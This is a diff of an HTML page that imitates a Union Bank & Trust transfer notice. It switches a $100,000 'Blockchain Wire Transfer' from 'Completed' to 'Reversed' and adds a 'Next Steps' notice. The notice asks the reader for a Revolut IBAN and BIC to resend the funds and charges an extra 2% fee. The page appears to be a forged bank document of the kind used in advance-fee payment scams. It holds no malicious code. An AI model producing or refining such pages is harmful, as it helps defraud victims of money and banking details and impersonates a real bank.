@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Union Bank & Trust - Payment Confirmation</title>
+    <title>Union Bank & Trust - Payment Status</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -59,8 +59,8 @@
             align-items: center;
         }
         .confirmation-box h2::before {
-            content: '✔';
-            color: #28a745;
+            content: '↩';
+            color: #dc3545;
             font-size: 28px;
             margin-right: 10px;
         }
@@ -72,6 +72,14 @@
         .details strong {
             color: #0055A6;
             font-weight: 500;
+        }
+        .note {
+            background-color: #e9f7ff;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 20px;
+            font-size: 15px;
+            color: #333;
         }
         .btn {
             display: inline-block;
@@ -88,7 +96,7 @@
             transform: translateY(-2px);
         }
         .status {
-            color: #28a745;
+            color: #dc3545;
             font-weight: 700;
             font-size: 18px;
             margin-top: 20px;
@@ -96,8 +104,8 @@
             align-items: center;
         }
         .status::before {
-            content: '✓';
-            background-color: #28a745;
+            content: '↩';
+            background-color: #dc3545;
             color: white;
             border-radius: 50%;
             width: 20px;
@@ -131,11 +139,11 @@
 <body>
     <header>
         <img src="logo.png" alt="Union Bank & Trust Logo" class="logo">
-        <h2>Union Bank & Trust</h2>
+        <h1>Union Bank & Trust</h1>
     </header>
     <div class="container">
         <div class="confirmation-box">
-            <h2>Payment Transfer Confirmation</h2>
+            <h2>Payment Transaction Status</h2>
             <div class="details">
                 <p><strong>Transaction Type:</strong> Blockchain Wire Transfer</p>
                 <p><strong>Amount:</strong> $100,000.00</p>
@@ -149,10 +157,13 @@
                 <p style="margin-left: 20px;"><strong>Bank Name:</strong> SumUp Limited</p>
                 <p><strong>Originating Bank:</strong> Union Bank and Trust, 6801 O St, Lincoln, NE 68510, United States</p>
                 <p><strong>Transaction Date:</strong> May 12, 2025</p>
-                <p class="status"><strong>Status:</strong> Completed</p>
+                <p class="status"><strong>Status:</strong> Reversed</p>
+            </div>
+            <div class="note">
+                <p><strong>Next Steps:</strong> The transaction has been canceled and reversed back to Union Bank and Trust. Please provide your Revolut account IBAN and BIC to resend the payment. Note that resending will incur an additional 2% charge.</p>
             </div>
             <a href="mailto:customerservice@unionbanktrust.com" class="btn">Contact Support</a>
-            <a href="confirmation.pdf" download class="btn">Download PDF</a>
+            <a href="confirmation.pdf" download class="btn">Download Confirmation</a>
         </div>
     </div>
     <footer>
